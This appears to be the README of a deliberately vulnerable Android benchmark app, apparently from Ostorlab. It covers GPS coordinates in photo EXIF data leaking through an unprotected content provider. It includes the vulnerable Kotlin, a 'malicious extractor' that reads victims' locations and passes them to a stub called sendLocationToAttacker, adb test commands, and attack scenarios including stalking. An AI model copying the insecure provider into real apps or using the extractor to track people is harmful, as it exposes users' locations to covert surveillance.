# oxo-android-ben61: Location Exposure via Camera Metadata

## Vulnerability Overview

Location Exposure via Camera Metadata occurs when Android camera applications embed GPS coordinates in photo EXIF metadata and expose these photos through unsecured content providers, allowing malicious apps to extract precise location data without requesting location permissions from the user.

## Attack Vector: Camera EXIF Metadata Location Extraction

**Brief Explanation**: A camera app that captures photos with embedded GPS coordinates and makes these photos accessible to other apps through unprotected content providers. Malicious apps can read the EXIF metadata to extract precise location information without requiring location permissions, effectively bypassing Android's location access controls.

**Key Characteristics:**
- GPS coordinates embedded in photo EXIF metadata during capture
- Photos exposed through unsecured content providers
- Location data extraction without location permissions
- Bypass of Android's location permission system via metadata access
- Historical location tracking through photo timeline analysis

**Vulnerable Code Pattern:**
```kotlin
// VULNERABLE: Camera app with unsecured content provider
class MainActivity : ComponentActivity() {
    fun capturePhotoWithLocation() {
        val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
        
        // Capture photo and embed GPS coordinates in EXIF
        val photoFile = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), 
                           "IMG_${System.currentTimeMillis()}.jpg")
        
        // VULNERABLE: GPS coordinates stored in EXIF metadata
        location?.let {
            val exif = ExifInterface(photoFile.absolutePath)
            exif.setLatLong(it.latitude, it.longitude)
            exif.setAttribute(ExifInterface.TAG_GPS_TIMESTAMP, 
                             System.currentTimeMillis().toString())
            exif.saveAttributes()
        }
        
        // Store photo info in content provider
        storePhotoMetadata(photoFile.absolutePath, location != null)
    }
}

// VULNERABLE: Unsecured content provider exposing photo metadata
class PhotoProvider : ContentProvider() {
    override fun query(uri: Uri, projection: Array<String>?, selection: String?, 
                      selectionArgs: Array<String>?, sortOrder: String?): Cursor? {
        val cursor = MatrixCursor(arrayOf("_id", "file_path", "timestamp", "has_gps"))
        // VULNERABLE: No permission check - Any app can access photo metadata
        photos.forEach { photo ->
            cursor.addRow(arrayOf(photo.id, photo.filePath, photo.timestamp, photo.hasGPS))
        }
        return cursor
    }
}
```

**Malicious Extractor Code:**
```kotlin
// MALICIOUS: Extracts GPS coordinates from photos without location permissions
class LocationExtractorReceiver : BroadcastReceiver() {
    fun stealLocationFromPhotos(context: Context) {
        // Query vulnerable content provider for photos
        val photoUri = Uri.parse("content://co.ostorlab.myapplication.photos/photos")
        val cursor = context.contentResolver.query(photoUri, null, null, null, null)
        
        cursor?.use {
            while (it.moveToNext()) {
                val filePath = it.getString(it.getColumnIndex("file_path"))
                val hasGPS = it.getInt(it.getColumnIndex("has_gps")) == 1
                
                if (hasGPS) {
                    // Extract GPS coordinates from EXIF metadata
                    extractLocationFromPhoto(filePath)
                }
            }
        }
    }
    
    private fun extractLocationFromPhoto(filePath: String) {
        try {
            val exif = ExifInterface(filePath)
            val latLong = FloatArray(2)
            
            if (exif.getLatLong(latLong)) {
                val latitude = latLong[0].toDouble()
                val longitude = latLong[1].toDouble()
                val timestamp = exif.getAttribute(ExifInterface.TAG_GPS_TIMESTAMP)
                
                // STOLEN: GPS coordinates from photo metadata
                Log.d("LOCATION_STOLEN", "Photo taken at: $latitude, $longitude at time: $timestamp")
                
                // Send stolen location data to attacker server
                sendLocationToAttacker(latitude, longitude, timestamp)
            }
        } catch (e: Exception) {
            Log.e("LocationExtractor", "Failed to extract location", e)
        }
    }
}
```
## Testing

```bash
# Install exiftool for GPS extraction (required for vulnerability demonstration)
sudo apt update && sudo apt install -y exiftool

# Install the vulnerable camera app
adb install -r oxo-android-ben61.apk

# Launch Camera Pro
adb shell am start -n co.ostorlab.myapplication/.MainActivity

# Grant location permission for GPS embedding
adb shell pm grant co.ostorlab.myapplication android.permission.ACCESS_FINE_LOCATION

# Capture photo with GPS coordinates (click the camera button)
sleep 2 && adb shell input tap 360 800

# Check if photos are accessible via content provider
adb shell content query --uri content://co.ostorlab.myapplication.photos/photos

# Query specific photo metadata
adb shell content query --uri content://co.ostorlab.myapplication.photos/photos/1

# Extract EXIF GPS data from photo files (if accessible)
adb shell run-as co.ostorlab.myapplication ls /data/data/co.ostorlab.myapplication/files/Pictures/

# Simulate malicious app accessing photo metadata
python3 exploit_test.py

# Monitor for location data extraction in logs
adb logcat -s LocationExtractor:D LOCATION_STOLEN:D

# Verify content provider exports photos without permission checks
adb shell dumpsys package co.ostorlab.myapplication | grep -A 10 "ContentProvider"
```

**Expected Results:**
```
Content Provider Query:
Row: 0 _id=1, file_path=/storage/.../IMG_20250828_135340.jpg, timestamp=1756389220545, has_gps=true

EXIF GPS Data (extracted from photo):
GPS Latitude: 40.7128
GPS Longitude: -74.0060  
GPS Timestamp: 2025-08-28 13:53:40
GPS Processing Method: fused

Exploit Test Output:
[+] Photos found: Row: 0 _id=1, file_path=..., has_gps=true
[+] Photo metadata: Row: 0 _id=1, file_path=..., timestamp=1756389220545, has_gps=true
[!] VULNERABILITY CONFIRMED: GPS location data exposed
```

**Difficulty**: Medium-High

## Impact Assessment

- **Confidentiality**: Critical - Complete exposure of historical and current location data through photo metadata
- **Integrity**: Low - Metadata can reveal location patterns but cannot be easily modified  
- **Availability**: Low - Does not affect camera functionality but enables privacy violations
- **OWASP Mobile Top 10**: M2 - Insecure Data Storage, M6 - Insecure Authorization, M10 - Extraneous Functionality
- **CWE**: CWE-200 (Information Exposure), CWE-552 (Files or Directories Accessible to External Parties), CWE-284 (Improper Access Control)

## Camera Metadata Attack Scenarios

1. **Historical Location Tracking**: Analyzing photo metadata to build timeline of user locations
2. **Social Engineering**: Using photo locations for targeted attacks based on frequented places
3. **Stalking/Harassment**: Tracking victim's movements through shared or stolen photos
4. **Corporate Espionage**: Extracting business locations and meeting places from employee photos  
5. **Privacy Violation**: Accessing sensitive location data without explicit location permissions

**Example Attack Flow:**
```bash
# 1. User installs camera app and grants location permission for geotagging
# 2. Malicious app installs without requesting any location permissions
# 3. Camera app captures photos with GPS coordinates in EXIF metadata
# 4. Photos stored and exposed via unsecured content provider
# 5. Malicious app queries content provider to access all photos
# 6. EXIF metadata extracted revealing precise GPS coordinates and timestamps
# 7. Complete location history reconstructed without location permissions
```

This vulnerability demonstrates how location data can be leaked through indirect channels like photo metadata, bypassing traditional permission controls and enabling covert location tracking.
